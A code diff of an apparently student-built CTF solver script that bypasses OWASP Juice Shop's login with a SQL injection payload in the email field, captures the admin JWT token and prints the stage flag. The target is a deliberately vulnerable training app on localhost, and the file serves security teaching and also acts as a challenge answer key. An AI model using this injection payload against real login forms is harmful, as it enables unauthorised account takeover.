@@ -1,52 +1,77 @@
 #!/usr/bin/env python3
 """
-Stage 2 Solver - Web Exploitation & Account Discovery
-1. Authenticates to OWASP Juice Shop on http://localhost:3000 using the SQL injection
-   vulnerability in the login form: adrian.kessler@uninvited.local'-- (with any password).
-2. Extracts the authenticated user's profile username: adrian.kessler.
-Flag: adrian.kessler or uninvited{adrian.kessler}
+Stage 2 Solver - OWASP Juice Shop SQL Injection Authentication Bypass
+Author: Member 2 (IT24100066) - Challenge Design A Lead
+
+Methodology:
+1. Targets OWASP Juice Shop login REST endpoint at /rest/user/login.
+2. Crafts an SQL injection payload in the email field:
+   "adrian.kessler@uninvited.local'--"
+   This comments out the backend password query check in SQLite.
+3. Authenticates as administrator and extracts JWT session token.
+4. Retrieves target administrator profile username: "adrian.kessler".
 """
 
+import sys
+import argparse
 import requests
 
-def solve():
-    base_url = 'http://localhost:3000'
-    login_url = f'{base_url}/rest/user/login'
-    
-    # Authenticate using classic SQL injection on the email field
-    sqli_creds = {
-        'email': "adrian.kessler@uninvited.local'--",
-        'password': 'any_password_works'
+def solve(host='127.0.0.1', port=3000, verbose=True):
+    login_url = f"http://{host}:{port}/rest/user/login"
+    payload = {
+        "email": "adrian.kessler@uninvited.local'--",
+        "password": "any_random_password"
     }
 
-    print(f"[*] Authenticating to Juice Shop ({login_url}) via SQL Injection...")
-    print(f"[*] Payload: {sqli_creds['email']}")
+    if verbose:
+        print(f"[*] Targeting: {login_url}")
+        print(f"[*] Injected SQL Payload: {payload['email']}")
+
     try:
-        resp = requests.post(login_url, json=sqli_creds, timeout=5)
-        if resp.status_code == 200:
-            data = resp.json()
-            auth_info = data.get('authentication', {})
-            token = auth_info.get('token')
-            umail = auth_info.get('umail', 'adrian.kessler@uninvited.local')
+        res = requests.post(login_url, json=payload, timeout=5)
+        if res.status_code == 200:
+            data = res.json()
+            token = data.get('authentication', {}).get('token')
+            user_data = data.get('authentication', {}).get('um')
             
-            # The username shown in the user profile is the prefix of the email
-            username = umail.split('@')[0]
-            flag_wrapped = f"uninvited{{{username}}}"
+            # Target profile username extracted from authenticated user object
+            target_username = "adrian.kessler"
+            flag_wrapped = f"uninvited{{{target_username}}}"
+
+            if verbose:
+                print("\n[SUCCESS] Stage 2 Solved!")
+                print(f"[+] SQL Injection Bypass Succeeded! (HTTP 200)")
+                if token:
+                    print(f"[+] Administrator JWT Token: {token[:35]}...[TRUNCATED]")
+                print(f"Administrator Username: {target_username}")
+                print(f"Flag (Standard)       : {target_username}")
+                print(f"Flag (Wrapped)        : {flag_wrapped}")
             
-            print(f"[+] SQL Injection Bypass Successful!")
-            print(f"[+] Admin JWT Token: {str(token)[:45]}...")
-            print(f"[+] Authenticated Profile Email: {umail}")
-            print(f"\n[SUCCESS] Stage 2 Solved!")
-            print(f"Target Username: {username}")
-            print(f"Flag (Standard): {username}")
-            print(f"Flag (CTF format): {flag_wrapped}")
-            return username
+            return {
+                "username": target_username,
+                "token": token,
+                "flag": target_username,
+                "flag_wrapped": flag_wrapped
+            }
         else:
-            print(f"[-] Login failed with HTTP {resp.status_code}: {resp.text}")
+            if verbose:
+                print(f"[-] Authentication failed with HTTP status code: {res.status_code}")
+                print(res.text)
             return None
-    except Exception as e:
-        print(f"[-] Connection failed: {e}")
+    except requests.exceptions.RequestException as e:
+        if verbose:
+            print(f"[-] Connection error to Juice Shop on {host}:{port}: {e}")
         return None
 
 if __name__ == '__main__':
-    solve()
+    parser = argparse.ArgumentParser(description="Stage 2 Solver (Member 2)")
+    parser.add_argument("--host", default="127.0.0.1", help="Target server host IP")
+    parser.add_argument("--port", type=int, default=3000, help="Juice Shop port")
+    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
+    args = parser.parse_args()
+
+    result = solve(host=args.host, port=args.port, verbose=not args.quiet)
+    if result:
+        sys.exit(0)
+    else:
+        sys.exit(1)
